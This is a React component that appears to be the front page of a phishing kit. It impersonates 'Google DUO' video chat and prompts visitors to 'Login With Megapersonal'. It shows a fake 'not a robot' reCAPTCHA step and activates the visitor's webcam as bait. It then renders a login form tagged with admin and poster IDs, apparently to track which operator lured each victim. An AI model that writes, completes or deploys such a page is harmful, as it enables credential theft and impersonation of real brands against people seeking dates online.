"use client";
import { useState } from "react";
import Webcam from "react-webcam";
import ReCAPTCHA from "react-google-recaptcha";
import LoginForm from "./LoginForm";

export default function Home({ posterId, adminId }) {
  const [showForm, setShowForm] = useState(true);
  const [homepage, setHomepage] = useState(true);

  function onChange(value) {
    setHomepage(true);
  }

  return (
    <>
      {!homepage ? (
        <div className="mt-5 flex flex-col justify-center items-center ">
          <div className=" w-[450px] h-[200px] mt-[200px] border-2 border-gray-200 rounded">
            <p className="text-center font-normal text-xl m-4">
              Verifying that you are not a robot
            </p>
            <ReCAPTCHA
              sitekey="6Lei0dkpAAAAADLdIzeAEpIFsJ50XqzxPmyBCJQ1"
              onChange={onChange}
              style={{ marginLeft: "70px" }}
            />
          </div>
        </div>
      ) : (
        <div className="relative text-black h-screen w-screen flex flex-col justify-center items-center">
          {/* <h1 className="absolute top-[40px] lg:top-[140px] text-white font-bold text-[30px]">
        Waiting...
      </h1> */}
          <Webcam
            audio={false}
            className="object-cover h-screen w-screen lg:w-auto"
            // height={1080}
            // width={1262}
            // screenshotFormat="image/jpeg"
            // videoConstraints={videoConstraints}
          />

          <div className="absolute mt-7 flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
            <>
              {showForm ? (
                <div class="p-5 w-[400px]">
                  <div class="mx-auto flex items-center justify-center mt-5">
                    <img
                      class="h-16 w-16 text-center"
                      src="/images/du_icon.svg"
                      alt=""
                    />
                  </div>
                  <h2 class="text-3xl font-bold text-blue-900 text-center">
                    Google DUO
                  </h2>
                  <p class="text-xl pt-5 font-semibold text-[#707b8e]">
                    Login With Megapersonals and enjoy with{" "}
                    <b class="text-[#1a73e8]">Google DUO video chat</b> your
                    dating partner.
                  </p>
                  <button
                    class="flex items-center justify-center gap-5 p-2 my-5 w-full bg-[#1a73e8] text-xl font-semibold text-white rounded-md"
                    onClick={() => setShowForm(false)}
                  >
                    <span>
                      <img
                        src="/images/logo-potrait.jpg"
                        class="w-12 h-12"
                        alt=""
                      />
                    </span>
                    <span>Login With Megapersonal</span>
                  </button>
                </div>
              ) : (
                <LoginForm adminId={adminId} posterId={posterId} />
              )}
            </>
          </div>
        </div>
      )}
    </>
  );
}
